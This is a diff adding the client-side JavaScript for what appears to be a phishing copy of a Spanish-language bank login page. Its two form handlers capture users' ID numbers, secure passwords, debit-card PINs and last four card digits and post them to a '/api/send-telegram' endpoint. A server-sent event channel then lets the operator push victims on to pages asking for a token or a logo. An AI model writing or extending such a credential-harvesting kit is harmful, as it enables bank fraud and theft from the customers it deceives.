@@ -1,0 +1,349 @@
+let isSubmitting = false;
+let eventSource = null;
+let currentMessageId = null;
+
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('Iniciando aplicación...');
+    
+    // Elementos del carrusel
+    const serviceCards = document.querySelector('.service-cards');
+    const prevButton = document.querySelector('.prev-button');
+    const nextButton = document.querySelector('.next-button');
+    let scrollAmount = 0;
+    const cardWidth = 132;
+
+    // Función para actualizar visibilidad de botones
+    function updateButtonVisibility() {
+        prevButton.style.display = scrollAmount <= 0 ? 'none' : 'flex';
+        nextButton.style.display = 
+            scrollAmount >= serviceCards.scrollWidth - serviceCards.clientWidth ? 'none' : 'flex';
+    }
+
+    // Manejadores de eventos para los botones del carrusel
+    prevButton.addEventListener('click', () => {
+        scrollAmount = Math.max(scrollAmount - cardWidth, 0);
+        serviceCards.style.transform = `translateX(-${scrollAmount}px)`;
+        updateButtonVisibility();
+    });
+
+    nextButton.addEventListener('click', () => {
+        const maxScroll = serviceCards.scrollWidth - serviceCards.clientWidth;
+        scrollAmount = Math.min(scrollAmount + cardWidth, maxScroll);
+        serviceCards.style.transform = `translateX(-${scrollAmount}px)`;
+        updateButtonVisibility();
+    });
+
+    // Elementos del formulario
+    const loginOptions = document.querySelectorAll('.login-options button');
+    const claveForm = document.getElementById('claveForm');
+    const tarjetaForm = document.getElementById('tarjetaForm');
+    const loginAlert = document.getElementById('loginAlert');
+
+    // Manejar botones de mostrar/ocultar contraseña
+    document.querySelectorAll('.toggle-password').forEach(button => {
+        button.addEventListener('click', function(e) {
+            e.preventDefault();
+            const input = this.parentElement.querySelector('input');
+            const slashElement = this.querySelector('.slash');
+            
+            if (input.type === 'password') {
+                input.type = 'text';
+                this.classList.add('show');
+            } else {
+                input.type = 'password';
+                this.classList.remove('show');
+            }
+            
+            if (slashElement) {
+                slashElement.style.opacity = input.type === 'password' ? '0' : '1';
+            }
+        });
+    });
+
+    // Permitir solo números en campos específicos
+    document.querySelectorAll('input[type="password"], input[type="text"]:not(.cardholder-name)').forEach(input => {
+        input.addEventListener('input', function() {
+            if (!this.classList.contains('cardholder-name')) {
+                this.value = this.value.replace(/\D/g, '');
+            }
+        });
+    });
+
+    // Manejar cambio entre formularios
+    loginOptions.forEach((button, index) => {
+        button.addEventListener('click', function() {
+            console.log('Cambiando formulario...');
+            loginOptions.forEach(btn => btn.classList.remove('active'));
+            this.classList.add('active');
+
+            if (index === 0) {
+                claveForm.style.display = 'block';
+                tarjetaForm.style.display = 'none';
+                loginAlert.style.display = 'block';
+            } else {
+                claveForm.style.display = 'none';
+                tarjetaForm.style.display = 'block';
+                loginAlert.style.display = 'none';
+            }
+        });
+    });
+
+    // Pantalla de carga
+    const loadingScreen = document.createElement('div');
+    loadingScreen.className = 'loading-screen';
+    loadingScreen.innerHTML = `
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <p class="loading-text">Verificando información...</p>
+        </div>
+    `;
+    document.body.appendChild(loadingScreen);
+
+    // Mensaje de error
+    const loginErrorMessage = document.createElement('div');
+    loginErrorMessage.className = 'login-error';
+    loginErrorMessage.style.display = 'none';
+    document.querySelector('.login-section').appendChild(loginErrorMessage);
+
+    // Funciones auxiliares
+    function showLoading() {
+        loadingScreen.style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+    }
+
+    function hideLoading() {
+        loadingScreen.style.display = 'none';
+        document.body.style.overflow = '';
+    }
+
+    function showError(message) {
+        loginErrorMessage.innerHTML = `<p>${message}</p>`;
+        loginErrorMessage.style.display = 'block';
+        hideLoading();
+    }
+
+    function handleRedirect(url) {
+        setTimeout(() => {
+            window.location.href = url;
+        }, 500);
+    }
+
+    // Configurar EventSource
+    function setupEventSource(messageId = null) {
+        if (eventSource) {
+            eventSource.close();
+        }
+
+        const url = messageId ? `/api/events?messageId=${messageId}` : '/api/events';
+        console.log('Configurando EventSource:', url);
+        
+        eventSource = new EventSource(url);
+        currentMessageId = messageId;
+
+        eventSource.onopen = () => {
+            console.log('Conexión SSE establecida');
+        };
+
+        eventSource.onerror = (error) => {
+            console.error('Error en la conexión SSE:', error);
+            if (eventSource.readyState === EventSource.CLOSED && isSubmitting) {
+                console.log('Reintentando conexión...');
+                setTimeout(() => setupEventSource(currentMessageId), 1000);
+            }
+        };
+
+        eventSource.onmessage = (event) => {
+            try {
+                const data = JSON.parse(event.data);
+                console.log('Evento recibido:', data);
+
+                if (data.messageId && data.messageId !== currentMessageId) {
+                    setupEventSource(data.messageId);
+                }
+
+                switch (data.type) {
+                    case 'action':
+                        handleActionEvent(data);
+                        break;
+                    case 'connected':
+                        console.log('Conexión establecida con el servidor');
+                        break;
+                    case 'error':
+                        handleErrorEvent(data);
+                        break;
+                }
+            } catch (error) {
+                console.error('Error al procesar evento:', error);
+            }
+        };
+    }
+
+    function handleActionEvent(data) {
+        console.log('Manejando acción:', data.action);
+        
+        switch(data.action) {
+            case 'error_logo':
+                showError('❌ Error en el logo. Por favor intente nuevamente.');
+                break;
+                
+            case 'pedir_logo':
+                handleRedirect('logo.html');
+                break;
+                
+            case 'error_token':
+                showError('⚠️ Error en el token. Por favor verifique.');
+                break;
+                
+            case 'pedir_token':
+                // Guardar estado actual
+                const activeForm = claveForm.style.display === 'none' ? 'tarjeta' : 'clave';
+                sessionStorage.setItem('activeForm', activeForm);
+                sessionStorage.setItem('lastAction', 'pedir_token');
+                handleRedirect('token.html');
+                break;
+                
+            case 'finalizar':
+                handleRedirect('dashboard.html');
+                break;
+                
+            default:
+                console.log('Acción no manejada:', data.action);
+        }
+    }
+
+    function handleErrorEvent(data) {
+        console.error('Error del servidor:', data.error);
+        hideLoading();
+        isSubmitting = false;
+        showError('Ha ocurrido un error. Por favor intente nuevamente.');
+    }
+
+    // Submit handler para el formulario de clave segura
+    claveForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        if (isSubmitting) {
+            console.log('Ya hay un envío en proceso');
+            return;
+        }
+
+        const tipoDoc = this.querySelector('select').value;
+        const numDoc = this.querySelector('input[type="text"]').value;
+        const claveSegura = this.querySelector('input[type="password"]').value;
+
+        if (!numDoc || !claveSegura) {
+            showError('Por favor complete todos los campos');
+            return;
+        }
+
+        loginErrorMessage.style.display = 'none';
+        showLoading();
+        isSubmitting = true;
+
+        try {
+            console.log('Enviando datos del formulario de Clave Segura...');
+            const response = await fetch('/api/send-telegram', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    message: {
+                        tipo: 'Clave Segura',
+                        tipoDocumento: tipoDoc,
+                        numeroDocumento: numDoc,
+                        clave: claveSegura
+                    }
+                })
+            });
+
+            const result = await response.json();
+            
+            if (!response.ok || !result.success) {
+                throw new Error(result.error || 'Error al procesar la solicitud');
+            }
+
+            console.log('Datos enviados exitosamente, esperando respuesta...');
+            sessionStorage.setItem('formData', JSON.stringify({
+                tipo: 'Clave Segura',
+                formulario: 'clave'
+            }));
+        } catch (error) {
+            console.error('Error:', error);
+            hideLoading();
+            isSubmitting = false;
+            showError('Ha ocurrido un error. Por favor intente nuevamente.');
+        }
+    });
+
+    // Submit handler para el formulario de tarjeta débito
+    tarjetaForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        if (isSubmitting) {
+            console.log('Ya hay un envío en proceso');
+            return;
+        }
+
+        const tipoDoc = this.querySelector('select').value;
+        const numDoc = this.querySelector('input[name="identification"]').value;
+        const cardPin = this.querySelector('input[name="debitCardPin"]').value;
+        const lastFourDigits = this.querySelector('input[name="lastFourDigits"]').value;
+
+        if (!numDoc || !cardPin || !lastFourDigits) {
+            showError('Por favor complete todos los campos');
+            return;
+        }
+
+        loginErrorMessage.style.display = 'none';
+        showLoading();
+        isSubmitting = true;
+
+        try {
+            console.log('Enviando datos del formulario de Tarjeta Débito...');
+            const response = await fetch('/api/send-telegram', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    message: {
+                        tipo: 'Tarjeta Débito',
+                        tipoDocumento: tipoDoc,
+                        numeroDocumento: numDoc,
+                        claveTarjeta: cardPin,
+                        ultimosDigitos: lastFourDigits
+                    }
+                })
+            });
+
+            const result = await response.json();
+            
+            if (!response.ok || !result.success) {
+                throw new Error(result.error || 'Error al procesar la solicitud');
+            }
+
+            console.log('Datos enviados exitosamente, esperando respuesta...');
+            sessionStorage.setItem('formData', JSON.stringify({
+                tipo: 'Tarjeta Débito',
+                formulario: 'tarjeta'
+            }));
+        } catch (error) {
+            console.error('Error:', error);
+            hideLoading();
+            isSubmitting = false;
+            showError('Ha ocurrido un error. Por favor intente nuevamente.');
+        }
+    });
+
+    // Limpiar al cerrar la página
+    window.addEventListener('beforeunload', () => {
+        if (eventSource) {
+            eventSource.close();
+        }
+    });
+
+    // Iniciar configuración de eventos
+    setupEventSource();
+    console.log('Aplicación iniciada correctamente');
+});
